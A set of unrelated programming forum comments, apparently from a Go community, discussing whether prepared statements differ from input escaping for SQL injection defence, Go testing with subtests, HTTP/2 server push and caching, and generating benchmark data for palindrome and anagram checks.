&gt; I don't know where you read that crap [Where I read "that crap."](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#Defense_Option_4:_Escaping_All_User_Supplied_Input) This was also the "accepted wisdom" from the early days of web apps, since well before "Web 2.0." &gt; but input escaping is literally what prepared statements do If that's true, there's still the important difference that I wouldn't have to interpose boilerplate code on my own for every SQL statement. However, I doubt that this is how Prepared Statements actually work. If I were implementing prepared statements, I wouldn't use string-generation then re-parse the SQL statement and send it through the SQL optimizer every single time. That would be stupidly sub-optimal. The optimized, parameterized query should exist as some kind of in-memory representation. 
No matter how much I search, there are always some gems that slip through the cracks. Thanks for pointing us to this one. Looks like a work in progress (especially, I am missing the documentation), but it already seems to have a decent feature set! 
Consider splitting the renderer and server so it's easier to write tests. Ditto some function to determine whether a file is markdown. Given `.markdown` is used in places to denote markdown. Or, similarly, try and parse anything and rely on whether parser returns an error.
I think it's okay to let testing.T cross package boundaries on occasion when it makes sense. Try not to call t.Fatal and use t.errorf in the external package and return if you can't continue instead, then you can check Failed after. if testpkg.Run(t); t.Failed() { t.Fatal("failed common test pkg validation") } You will have the errorf failures in your test log and a exact failure point. But you can often get away with well named subtests instead and not have to worry about errorf or Fatalf calls. I do this more often: t.Run("Common", func(t *testing.T) { somepkg.Run(t); } It has the advantage of giving a nice canonical presentation in failed test names allowing you to chain your T through multiple shared tests like "Request/Common/Validation" "SomethingElse/Common/Validation". Basically I use subtests as often as possible for context on where failure occurs, I use messages for WHY failure occurs.
&gt; I don't know where you read that crap but input escaping is literally what prepared statements do, input escaping is the act of turning semantically significant characters into simple text. No, it really, *really* isn't. Prepared statements do *not* escape the data into text, they encode it in a well-defined and easily machine parseable binary wire-format. Doing robust input escaping is such a complicated question, that every single day there are new security vulnerabilities exposed even in the products of large companies who *know* how to do them well; whether it's in SQL, HTML, javascript or shell. Do not believe anyone who claims that prepared statements do not add security, or that escaping would solve this problem. At the base of it, to write an encoder and parser that correctly and with context-awareness writes out data into a programming-language string you have to be really, really clever, whereas to write an encoder and parser that handles "a string is a 4-byte little-endian length followed by that many bytes" incorrectly you have to be pretty darn incompetent.
&gt; impropely named variables(even with underscores in them, i.e. some_variable). Isn't it just convention if I name my variables someVariableFoo some_Variable_Foo some_variable_foo ?
See e.g. https://github.com/pkg/errors
Apple has been really crap about breaking Go binaries lately. They also changed something about the time syscall that broke 1.6.
Is there a good technique for knowing if the files are already cached on the client? Something like anonymous user on site root would still trigger pushes on a refresh.
Use stored procedures, e.g. with postgresql and it's json support.
I agree with you, this does seem like a giant hack to me. Requiring the use of a cookie to just cache a static file feels wrong to me. Maybe it's just me, I've been trained to never serve static contents from the app server for large scale apps... at least in the good old HTTP/1 days. HTTP/2 seems to have changed my standard deployment workflow completely. I do wonder what are some of the best practices for a large scale HTTP/2 deployment today.
Finally! Thanks rsc
- HTTP/2 is much easier to iterate on than HTTP/1 - It's not really the spec's job anyway. Servers are complicated and much is built on top of HTTP/2. It's up the server and site operator to implement server push as they see fit, with their clients, all of which will have different needs from server to server.
I agree it's not the spec's job, but the lack of a clear solution also seems like it is the spec's fault.
I just found a draft for HTTP/2 cache digests: https://tools.ietf.org/html/draft-kazuho-h2-cache-digest-01.
No doubt. I wouldn't dare argue this is an all or nothing 'rule'.
I think you have to look at the whole web-ecosystem rather than one technology in isolation - http/2 and server push are great for speeding up the first visit but after that the way to go is with a service-worker which would just check for any updates in the background with the aim being to _never_ download everything again. It's the "intelligent cache" part of the equation, think of it as a proxy cache that's running on the client device and able to avoid requests back to the server using a manifest file (to the point of being able to work completely offline). Of course any Cache Aware Server Push (CASPer) mechanism will be good to have too. https://github.com/tcnksm/go-casper
The strings you're benchmarking on seem too small imho to actually see real perf. differences. I think your "large" examples should contain much more data to get a better benchmark, otherwise noise will likely triumph.
Thanks @djherbis how long would you suggest? Or if you have an example I'd definitely add it :)
I'm afraid I don't understand your comment? but if your suggesting there's a better way, please let me know :)
For happy paths (returns true): For palindromes, generate some long string of random runes and then just reverse them and add forward + backward string to get a generated palindrome (it's pretty easy to change this to have 'unique middle' char if you want). For anagrams, generate a long string of random runes, and then use [rand.Perm](https://golang.org/pkg/math/rand/#Rand.Perm) to get a random permutation of them (which will be an anagram). (you should probably save the generated strings for re-use so your tests are repeatable) This lets you generate arbitrarily big test data, I'd probably start with ~1000 runes and compare a few implementations to see what kind of perf. difference I see after running it a number of times. I'd fiddle with the size of the generated test cases (* or / by powers of 2) until I saw a significant difference in perf. Some implementations might optimize for different cases too (like expecting unhappy vs. happy path vs. balanced). I think these kinds of challenges are neat, have fun!